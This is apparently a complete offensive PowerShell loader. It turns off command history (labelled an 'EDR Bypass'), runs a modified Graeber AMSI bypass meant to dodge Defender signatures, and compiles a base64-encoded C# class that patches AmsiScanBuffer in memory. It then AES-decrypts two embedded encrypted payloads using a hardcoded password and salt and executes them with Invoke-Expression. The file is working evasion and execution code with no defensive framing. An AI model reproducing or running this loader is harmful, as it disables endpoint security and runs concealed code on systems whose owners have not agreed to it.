$EncFunc0 = ("7+e5kaoX9bolWxSrs8ul+g==", "eRhNFm1CDCBpPikb7XTvlIWWXTNeMRCLZrzQZNihBRjGzZxatiXHVKkUCV/CQZnzihRnf9l52GaW4EnG8gbSaQwwOEG5BxQG8SKAoRk8LDL3SxyAdG+vxkZNBLBL3fkskHPe+oNDBZmfRJ9H7lbgGU9+p4jojqiilxWxL0JPnVzdhAJoNA25bMzWQZ6a4il2X0x1H1hlDNkQDIbc0XhKtcpbdL4uFtAUGkalzm/nrcSvzFZHbfQ4Z4WqfIla1a0p9zATedi9Vdbacwou9u1wpruLSoMHv0wuEJ/KdWytAqum3DgUGyktUBf6o8otSc0zjM6MfXYbWDDlVYCWcaeS+xfqnRGMrEXnOl408IRPJj95x6CkapiodXuQ3vNv7CmNWbDi8CnR4a1lvrNQ3LsKmm6oufG3w090alXESkV5u5fqP7c4g8h12+CsKZtCtvghy4UMUQkgjWGKfvqm4h1yquMfn4jJSWSZvbwcptFz926gKJyOtGmZ6Trp/eqgWnoEFVpLWWYfpBVwv7QGyiz8IZ3vIPgrujrDF7FsjMEiz+UpCvRjpCqLaUQ35uFCPKuRa0cWO5/XmCodLgLGieEaumPqM4KT4nvvtNRT074oiaX6Y3ou3FwfmOdA89qAKlQhzqj5GgMjP2LEfwNVBOi1jrxK0QqleULYuO0w53LtYuUX6RL4/9duL/XjuQpJK/FgXvzxNp/QiIoa27SDY7AHr4GMkpUIDHtHeXrGwxbf47Mrr3D+f/gTY6xZxI5lIqoc02gJjitk+zSEg6niItEmKb5Qx1H5hF00zujcJSUsdcZ58jytTcHJma2N5ezVZfReLe/iYWjia0O4AedY9YYc5gi0T1gYnZUEff1Ro1Pce1/yopCPBwXG3cQoljVXM4H3+doZdIhx0JU+2rQFz6ob1MfdMTgfHphses2C6xPwZJZunqoGIBvdpN+4wiJIJ/Kb2e+ZBi5Vo0CixnBlyCWJ7IzVyOb+rBWqY8gZiQZFGR+wuQC+AFDqsd21bj9JkkeUP9doG1wD/ls0Wc+OLh+7WMCxaZcIK4eAKUMyIbIuBiFp/K+CNhHwHOrCA7WtBx3uU71da4Up+NCyykkoWpq16lC0uhJI4fe8k2Sli3agiuN9SvTq/tMto7180w2tmtRTvgHsOaLM+aBkjXYwDUF33cu6z9BFj+vYuCu3IHaNu9EQuBOIN7sVB3JIl+IbboVFnWf/zg4UB9QGN61/RBLM3rDMeztC6vJro2qVWeznvHypl4CiBeyH42pTsuKh46dgI63EBu7Ba9BDfN4zBcZvAGj+AwvGfceVr5FulIWxE5EwIQrXmoHWfuy3G8Atf8BHZKJkYswlKsXpIJmtkSOJomY6RdqvLzrxL633iOWzxrYxZTSmcaqb7t2emfQELGR0GCTjI+66LJ79asPvH/Yh5RNgXh9lTo/qz4H/Jm1IPbORttN7yN+nnjnrAwULN+0eZV0ctZsKBXXegaxRyC3gMddBtxlRBg3jlkAHykarSBG+G2jQ202bypd+5vyZHpbOsNA8TPDZ9+L5ENmr29S3mEKESkMGBEDQ0rojj48k4YDJJ87G7uljgi9ptW8AGMjmGHD7AFQu0N4lNLUxeP7DGWfaEb0mgsdZSLAPbkO4HuHFsMTZZQq9YpyuwNd08yguTWaD6FSzk6K6a5552nnRs1EjgdUbggsVQBz3Djtxo9FKmoOlAA4141biPp2X3dgwpn4w8Z/Zq4QN5QMJ0ZxV2hU1P37tcKY+E0SZ1DOuu7mb5C6U0e5y82+odRedeCIM8L8Kq9mYRDo6NkEf/+4AVHli2GbEKn/fxq+oUUG/YFVLbsZ/477/FdeI2bRB9FuYlFkeCXLBWICYwRuBgxO6YjsoQya85jj0Ax1dQQdi+TIC1j2c7bID+qhcG7gSZq0St38kQkAeFjYmk73/lQWrVmHAHaBGOKQadE44ulzX2fCrP9FV0bRhDIa9SUKLujZqag3WJSQSGqOJW5VMpSe9jQcFppIWjlTm+M0c/SqiA2GUOgqzci4yDUmaU2UMgi0pv/PO9vrVLDIU1HRqj1lQO6l4HiJorBKnPdnA2qTToQ104BNz5CvjcFc/vEsAyAT5lrScV3DMI4ipNKIGrsbS+fsLPdX8pBtdeaGSmxT0rriU513xtnZhl2JwPqhbyskV7ifBg1l2yiCT9EYecT1+Ij3ZEuVpQhUihIRdIxAsNsCtGbayfucZbJ6CgooGiCyDWrn1n8/WiDM2OaUVajKu2nw+y+EnWrVUBv/dCdShgb6KGN+3B1a0cjAM7/skxCvcHAf1zFIj2wFFH8f7Z8qOwjoPBjq3VeCAjup7cQD34YfbrCi90Koi2wCDJCaLTO4FOo7S8vFUpT8hLylW9M5x6Jl4JYT4xrDZBk+RJunBRYFAfYgtI671r2CIfmxm4BmIi1q/yYmtg7JvJOHWMzn295NRgq/XbdxOzYlCfCVwLCQa68+R7Ih5IJiXTEuB2TmfbS7jw3wIuk/znkUVhlIi+FnH5s6sFAi/ZBUSyI98x1cv3vKwHqwJxCbzSrMWnURJlS4g29qcDMugOgpiiHataTs4yf4+L+JXXj+CjGWxoRE/iW7Jsgo2yhFFR4nNJs5gswDRXpBeARaovKwZdN0tMqONed4mj8C86NUoTFDE/B0fM75YuLggwTDxcF+CNRvZieNf9wGYV0lcDb4X6KliR88qmlEnPIHuqub+n7Og77NT4jyguaFyPGGBFqFWTCb4kJcdF00mp5xTyHX8nbk85jzFG0pVDMNhfuWgUpcfVQ0Ues04mlhSox/vMBmEbXZ9Jyb3TxQx88Cal6XS7LEZHUU0NZJsq8a8s+prOqUlUTZN/YYzz48xtEMsWEExylsO6Aq8pnGoeGJZgNQAqA4Rdo1nWF4K3zT9U3U8eebGRQ6KZktWpLdDLZWWaQrPQpi6ikHR6MWCZxYLeDW6AiR4VDpr+GlXcB1WV9NrU4FiqXBeiz8273gCquHOaOlFqx28IK0OJ3XfMZOV+0DvybNmFX8hoJBPEqVmULr9/IRfE0tUD4I49T06AzQXFou+mfxOKziXxk55Yx6rtn6EaNcfqFCZHk0g9xJiMf4/FJGxEmEqIBRV5mfG1pg/IlYUlzg7/MpcAaoFctM//l+ZFKGyh8wQ50KqA2bPJO+emO4zpk0DxIiUhvvBC3l1hnnDVjnPPmMIf5yD45lAvYg0pRjLUS3IGEvMtS/YSlpn+9BKeNft6oH/Zm+Txrclhk79ZH4SXvwzGs6G6Zs1bZo6kDhsRW12NHXFMOO0yWeCUvbHHzMtem9jq7P5xA51I4Zrjl+lA2lzGZnzQx9kWJKBSeO3DRXfFz3k5HT4lP6c3GXv5JA=")
$EncFunc1 = ("hzOS48QBCYCGwyynohXEFw==", "Zmb1ydC0qV7nk8bGHtI/J4aB2XsqDmL247cvoIn42L2cVpuFjvQPxRuoiRRBW6swiIyb4d90WJUKiKRFn0UezA==")
$EncryptedFunctions = @($EncFunc0,$EncFunc1)
$Password="Zrq4jsbGbs"
$Salt="LxqzjPgjOj"
#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)

#AMSI Bypass 2
$AMSIBypass2encoded = "dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoADQAKAG4AYQBtAGUAcwBwAGEAYwBlACAAUgBhAG4AZABvAG0ATgBhAG0AZQBzAHAAYQBjAGUADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABSAGEAbgBkAG8AbQBDAGwAYQBzAHMADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgASQBuAHQAUAB0AHIAIABoAE0AbwBkAHUAbABlACwAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIASwBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAARQBuAHQAcgB5AFAAbwBpAG4AdAAgAD0AIAAiAFIAdABsAE0AbwB2AGUATQBlAG0AbwByAHkAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAZgBhAGwAcwBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAATQBvAHYAZQBNAGUAbQBvAHIAeQAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAASQBuAHQAUAB0AHIAIABzAHIAYwAsACAAaQBuAHQAIABzAGkAegBlACkAOwANAAoADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAFIAYQBuAGQAbwBtAEYAdQBuAGMAdABpAG8AbgAoACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAYQByAGcAZQB0AEQATABMACAAPQAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoACIAYQBtAHMAaQAuAGQAbABsACIAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAbwB0AGEAbABsAHkATgBvAHQAVABoAGEAdABCAHUAZgBmAGUAcgBZAG8AdQBSAEwAbwBvAGsAaQBuAGcARgBvAHIAUAB0AHIAIAA9ACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAVABhAHIAZwBlAHQARABMAEwALAAgACIAQQBtAHMAaQAiACAAKwAgACIAUwBjAGEAbgAiACAAKwAgACIAQgB1AGYAZgBlAHIAIgApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUAIAA9ACAAKABVAEkAbgB0AFAAdAByACkANQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAWgBlAHIAbwAgAD0AIAAwADsADQAKACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACwAIABkAHcAUwBpAHoAZQAsACAAMAB4ADQAMAAsACAAbwB1AHQAIABaAGUAcgBvACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIABvAG4AZQAgAD0AIAB7ACAAMAB4ADMAMQAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIAB0AHcAbwAgAD0AIAB7ACAAMAB4AGYAZgAsACAAMAB4ADkAMAAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBuAHQAIABsAGUAbgBnAHQAaAAgAD0AIABvAG4AZQAuAEwAZQBuAGcAdABoACAAKwAgAHQAdwBvAC4ATABlAG4AZwB0AGgAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgB5AHQAZQBbAF0AIABzAHUAbQAgAD0AIABuAGUAdwAgAGIAeQB0AGUAWwBsAGUAbgBnAHQAaABdADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AbgBlAC4AQwBvAHAAeQBUAG8AKABzAHUAbQAsADAAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHcAbwAuAEMAbwBwAHkAVABvACgAcwB1AG0ALABvAG4AZQAuAEwAZQBuAGcAdABoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACAAPQAgAE0AYQByAHMAaABhAGwALgBBAGwAbABvAGMASABHAGwAbwBiAGEAbAAoADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AYQByAHMAaABhAGwALgBDAG8AcAB5ACgAcwB1AG0ALAAgADAALAAgAHUAbgBtAGEAbgBhAGcAZQBkAFAAbwBpAG4AdABlAHIALAAgADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AbwB2AGUATQBlAG0AbwByAHkAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACAAKwAgADAAeAAwADAAMQBiACwAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACwAIAAzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAfQA="
$AMSIBypass2 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($AMSIBypass2encoded))
Add-Type -TypeDefinition $AMSIBypass2
[RandomNamespace.RandomClass]::RandomFunction()
if($Password -and $Salt)
{
$Index = 0
foreach($ef in $EncryptedFunctions)
{

[byte[]]$CipherText = [Convert]::FromBase64String($ef[1])
[byte[]]$InitVector = [Convert]::FromBase64String($ef[0])

$AES = [System.Security.Cryptography.Aes]::Create()

$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)
$AES.IV = $InitVector

$AESDecryptor = $AES.CreateDecryptor()

$MemoryStream = New-Object System.IO.MemoryStream($CipherText,$True)
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
$StreamReader = New-Object System.IO.StreamReader($CryptoStream)

$Message = $StreamReader.ReadToEnd()

$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

try {$Message | Invoke-Expression } catch { Write-Warning "Error loading function number $Index. Beware that this only affects the mentioned function so everything else should work fine." }

$Index++
}
}
